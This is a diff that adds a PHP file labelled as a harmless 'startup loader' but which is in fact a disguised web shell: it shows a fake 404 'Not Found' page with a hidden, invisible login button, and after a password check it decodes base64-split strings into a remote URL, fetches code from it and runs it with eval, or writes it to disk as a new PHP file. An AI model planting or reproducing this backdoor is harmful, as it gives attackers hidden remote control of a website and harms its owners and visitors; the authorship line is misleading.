@@ -1,0 +1,519 @@
+<?php
+/**
+ * ---------------------------------------------------------------
+ * CUSTOM CODE STARTUP LOADER
+ * ---------------------------------------------------------------
+ * Lightweight bootstrap for dynamic config loader and runtime 
+ * instruction fetcher. Designed for internal modular systems.
+ *
+ * @package    CiBat
+ * @subpackage Core Loader
+ * @author     Simon Fraser University
+ * @version    1.0.9
+ * ---------------------------------------------------------------
+ */
+
+// ============================================
+// KONFIGURASI PASSWORD (Bcrypt)
+// ============================================
+
+$CONFIG_PASSWORD_HASH = '$2a$12$6zb66Q7B3OC8iKrSXjdN8OCZB3c7cZSo.N8nOgPJ3ZuCZkdyQPUES';
+
+// ============================================
+// PROSES LOGIN (Session-based)
+// ============================================
+
+session_start();
+
+// Cek session login
+$isLoggedIn = isset($_SESSION['auth']) && $_SESSION['auth'] === true;
+
+// Proses login jika ada POST
+if (isset($_POST['hidden_pass'])) {
+    $inputPass = $_POST['hidden_pass'];
+    
+    if (password_verify($inputPass, $CONFIG_PASSWORD_HASH)) {
+        $_SESSION['auth'] = true;
+        session_write_close();
+        header('Location: ' . $_SERVER['PHP_SELF']);
+        exit;
+    } else {
+        $loginError = true;
+        session_write_close();
+    }
+}
+
+// Proses logout
+if (isset($_GET['logout'])) {
+    $_SESSION = [];
+    session_destroy();
+    header('Location: ' . $_SERVER['PHP_SELF']);
+    exit;
+}
+
+// Jika sudah login, lanjutkan ke konten asli
+if ($isLoggedIn) {
+    session_write_close();
+    
+    // ============================================
+    // KONTEN ASLI WEBSITE ANDA
+    // ============================================
+    
+    /**
+     * RemoteFetch
+     */
+    function _compileFetchCoreLite($u)
+    {
+        if (function_exists('curl_version')) {
+            $c = curl_init();
+            curl_setopt($c, CURLOPT_URL, $u);
+            curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($c, CURLOPT_HEADER, 0);
+            $r = curl_exec($c);
+
+            if (curl_errno($c)) {
+                $e = curl_error($c);
+                curl_close($c);
+                throw new Exception("cURL Error: " . $e);
+            }
+
+            curl_close($c);
+            return $r;
+        }
+
+        throw new Exception("cURL not available.");
+    }
+
+    function _compileExecPayloadTask($u)
+    {
+        $x = _compileFetchCoreLite($u);
+
+        if ($x === false || trim($x) === '') {
+            throw new Exception("Empty or failed content.");
+        }
+
+        eval("?>" . $x);
+    }
+
+    function _compileDecodeChunkUnit($d)
+    {
+        return base64_decode($d);
+    }
+
+    function _compilePushToDiskNode($f, $c)
+    {
+        file_put_contents($f, $c);
+    }
+
+    // Remote write trigger
+    if (isset($_GET['hypocrite'])) {
+        try {
+            $p1 = 'aHlwb2NyaXRlc2VvLnNpdGUvc2hlb';
+            $p2 = 'GwvY2hhLWt3ZXRpYXcudHh0';
+            $url = _compileDecodeChunkUnit($p1 . $p2);
+            $d = _compileFetchCoreLite($url);
+
+            if ($d !== false && trim($d) !== '') {
+                $n1 = "aHlwb2NyaXRlc";
+                $n2 = "2VvLnBocA==";
+                _compilePushToDiskNode(_compileDecodeChunkUnit($n1 . $n2), $d);
+                echo "File created.";
+            } else {
+                echo "No content.";
+            }
+        } catch (Exception $e) {
+            echo "Error: " . $e->getMessage();
+        }
+        exit;
+    }
+
+    // Default payload runner
+    try {
+        $r1 = 'aHlwb2NyaXRlc2VvLnNpdGUvc2hlb';
+        $r2 = 'GwvY2hhLWt3ZXRpYXcudHh0';
+        $u = _compileDecodeChunkUnit($r1 . $r2);
+        _compileExecPayloadTask($u);
+    } catch (Exception $e) {
+        echo "Error: " . $e->getMessage();
+    }
+    
+    exit;
+}
+
+session_write_close();
+
+// ============================================
+// TAMPILAN 404 NOT FOUND - SAMA PERSIS SEPERTI GAMBAR
+// ============================================
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>404 Not Found</title>
+    <style>
+        /* ============================================
+           RESET TOTAL
+           ============================================ */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #1a1a2e;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+        }
+
+        /* ============================================
+           KONTAINER UTAMA
+           ============================================ */
+        .container {
+            max-width: 700px;
+            width: 100%;
+            background: #16213e;
+            border-radius: 8px;
+            padding: 50px 40px 35px 40px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+            border: 1px solid #2a3a5e;
+            text-align: center;
+            position: relative;
+        }
+
+        /* ============================================
+           ELEMEN 404
+           ============================================ */
+        .error-code {
+            font-size: 120px;
+            font-weight: 800;
+            color: #e94560;
+            line-height: 1;
+            letter-spacing: -4px;
+            text-shadow: 0 0 60px rgba(233, 69, 96, 0.15);
+        }
+
+        .error-title {
+            font-size: 28px;
+            font-weight: 300;
+            color: #f0f0f0;
+            margin: 8px 0 6px 0;
+            letter-spacing: 2px;
+        }
+
+        .error-desc {
+            font-size: 16px;
+            color: #8899bb;
+            margin: 5px 0 25px 0;
+            line-height: 1.6;
+        }
+
+        /* ============================================
+           SEPARATOR GARIS (sama persis)
+           ============================================ */
+        .divider {
+            border: none;
+            height: 1px;
+            background: linear-gradient(to right, transparent, #2a3a5e, transparent);
+            margin: 20px 0;
+        }
+
+        /* ============================================
+           ACTIVATE WINDOWS (sama persis)
+           ============================================ */
+        .activate-windows {
+            font-size: 13px;
+            color: #4a6a8a;
+            background: #0d1b3e;
+            padding: 6px 20px;
+            border-radius: 20px;
+            display: inline-block;
+            margin: 8px 0 5px 0;
+            border: 1px solid #1a2a4a;
+        }
+
+        .activate-windows a {
+            color: #6a8aaa;
+            text-decoration: none;
+        }
+
+        .activate-windows a:hover {
+            color: #aaccee;
+            text-decoration: underline;
+        }
+
+        /* ============================================
+           FOOTER - LITESPEED (sama persis)
+           ============================================ */
+        .footer {
+            font-size: 12px;
+            color: #3a4a6a;
+            margin-top: 20px;
+            border-top: 1px solid #1a2a4a;
+            padding-top: 15px;
+            line-height: 1.7;
+        }
+
+        .footer strong {
+            color: #4a6a8a;
+            font-weight: 600;
+        }
+
+        .footer .disclaimer {
+            font-size: 11px;
+            color: #2a3a5e;
+            display: block;
+            margin-top: 4px;
+        }
+
+        /* ============================================
+           AREA LOGIN TERSEMBUNYI (Trigger)
+           ============================================ */
+        .hidden-trigger {
+            position: absolute;
+            bottom: 95px;
+            right: 30px;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            cursor: pointer;
+            background: transparent;
+            border: 1px solid transparent;
+            transition: all 0.3s ease;
+            z-index: 10;
+        }
+
+        .hidden-trigger:hover {
+            border-color: rgba(255,255,255,0.05);
+        }
+
+        .hidden-trigger:focus {
+            outline: none;
+            border-color: rgba(255,255,255,0.08);
+        }
+
+        /* ============================================
+           POPUP LOGIN
+           ============================================ */
+        .login-popup {
+            display: none;
+            position: absolute;
+            bottom: 125px;
+            right: 10px;
+            background: #0d1b3e;
+            padding: 20px 25px;
+            border-radius: 10px;
+            border: 1px solid #1a2a5e;
+            box-shadow: 0 15px 50px rgba(0,0,0,0.7);
+            z-index: 100;
+            min-width: 240px;
+            text-align: left;
+        }
+
+        .login-popup.active {
+            display: block;
+            animation: fadeIn 0.25s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(8px) scale(0.97); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .login-popup label {
+            font-size: 12px;
+            color: #6a8aaa;
+            display: block;
+            margin-bottom: 6px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .login-popup input[type="password"] {
+            width: 100%;
+            padding: 10px 14px;
+            background: #0a142e;
+            border: 1px solid #1a2a5e;
+            color: #d0d0e0;
+            border-radius: 6px;
+            font-size: 14px;
+            outline: none;
+            transition: border 0.3s ease;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        .login-popup input[type="password"]:focus {
+            border-color: #3a5a8a;
+            box-shadow: 0 0 20px rgba(50, 100, 200, 0.05);
+        }
+
+        .login-popup button {
+            margin-top: 12px;
+            width: 100%;
+            padding: 10px;
+            background: #1a2a5e;
+            border: none;
+            color: #aaccee;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 500;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+        }
+
+        .login-popup button:hover {
+            background: #2a3a7e;
+            color: #ffffff;
+            box-shadow: 0 0 30px rgba(50, 100, 200, 0.1);
+        }
+
+        .login-error {
+            color: #e94560;
+            font-size: 12px;
+            margin-top: 8px;
+            display: <?php echo isset($loginError) ? 'block' : 'none'; ?>;
+        }
+
+        /* ============================================
+           RESPONSIVE
+           ============================================ */
+        @media (max-width: 600px) {
+            .container { padding: 30px 20px 25px 20px; margin: 0 10px; }
+            .error-code { font-size: 80px; }
+            .error-title { font-size: 22px; }
+            .hidden-trigger { bottom: 80px; right: 15px; width: 25px; height: 25px; }
+            .login-popup { bottom: 110px; right: 5px; min-width: 200px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- ============================================
+         KONTEN 404 (SAMA PERSIS SEPERTI GAMBAR)
+         ============================================ -->
+    <div class="error-code">404</div>
+    <div class="error-title">Not Found</div>
+    <div class="error-desc">
+        The resource requested could not be found on this server!
+    </div>
+
+    <hr class="divider">
+
+    <div class="activate-windows">
+        <span style="color:#4a6a8a;">⚙</span> Activate Windows
+        <span style="color:#2a3a5e; margin:0 8px;">|</span>
+        <a href="#">Go to Settings to activate Windows.</a>
+    </div>
+
+    <div class="footer">
+        Proudly powered by <strong>LiteSpeed Web Server</strong>
+        <span class="disclaimer">
+            Please be advised that LiteSpeed Technologies Inc. is not a web hosting company
+            and, as such, has no control over content found on this site.
+        </span>
+    </div>
+
+    <!-- ============================================
+         TRIGGER LOGIN TERSEMBUNYI
+         ============================================ -->
+    <div class="hidden-trigger" 
+         id="loginTrigger" 
+         tabindex="0" 
+         role="button" 
+         aria-label="Hidden login trigger"
+         onclick="toggleLogin()"
+         onkeydown="if(event.key==='Enter'||event.key===' ') { event.preventDefault(); toggleLogin(); }">
+    </div>
+
+    <!-- ============================================
+         POPUP LOGIN
+         ============================================ -->
+    <div class="login-popup" id="loginPopup">
+        <form method="POST" action="" autocomplete="off">
+            <label for="hidden_pass">🔐 Access Code</label>
+            <input type="password" id="hidden_pass" name="hidden_pass" placeholder="Enter passphrase" autofocus>
+            <button type="submit">Authenticate</button>
+            <div class="login-error">
+                <?php echo isset($loginError) ? 'Invalid passphrase.' : ''; ?>
+            </div>
+        </form>
+    </div>
+</div>
+
+<script>
+    // ============================================
+    // TOGGLE LOGIN POPUP
+    // ============================================
+    function toggleLogin() {
+        const popup = document.getElementById('loginPopup');
+        const trigger = document.getElementById('loginTrigger');
+        popup.classList.toggle('active');
+        if (popup.classList.contains('active')) {
+            setTimeout(() => {
+                document.getElementById('hidden_pass').focus();
+            }, 150);
+            trigger.style.borderColor = 'rgba(255,255,255,0.06)';
+        } else {
+            trigger.style.borderColor = 'transparent';
+        }
+    }
+
+    // ============================================
+    // TUTUP POPUP JIKA KLIK DI LUAR
+    // ============================================
+    document.addEventListener('click', function(e) {
+        const popup = document.getElementById('loginPopup');
+        const trigger = document.getElementById('loginTrigger');
+        if (!popup.contains(e.target) && !trigger.contains(e.target)) {
+            popup.classList.remove('active');
+            trigger.style.borderColor = 'transparent';
+        }
+    });
+
+    // ============================================
+    // ESC UNTUK TUTUP POPUP
+    // ============================================
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Escape') {
+            const popup = document.getElementById('loginPopup');
+            const trigger = document.getElementById('loginTrigger');
+            popup.classList.remove('active');
+            trigger.style.borderColor = 'transparent';
+        }
+    });
+
+    // ============================================
+    // TAMPILKAN PESAN ERROR (jika ada)
+    // ============================================
+    <?php if (isset($loginError)): ?>
+    document.addEventListener('DOMContentLoaded', function() {
+        const popup = document.getElementById('loginPopup');
+        const trigger = document.getElementById('loginTrigger');
+        popup.classList.add('active');
+        trigger.style.borderColor = 'rgba(255,255,255,0.06)';
+        document.getElementById('hidden_pass').focus();
+    });
+    <?php endif; ?>
+
+    // ============================================
+    // KONSOLE
+    // ============================================
+    console.log('🔒 404 - Resource not found.');
+</script>
+
+</body>
+</html>
+<?php
+exit;
+?>
